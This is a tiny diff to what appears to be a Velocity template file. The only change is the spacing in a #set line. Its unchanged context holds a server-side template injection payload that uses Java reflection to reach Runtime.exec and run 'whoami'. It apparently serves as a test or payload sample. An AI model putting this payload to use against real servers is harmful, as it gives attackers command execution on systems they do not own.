@@ -1,4 +1,4 @@
-#set($exp = "exp")
+#set($exp="exp")
 $exp.getClass().forName("java.lang.Runtime").getRuntime().exec("whoami")
 <html>
 <body>
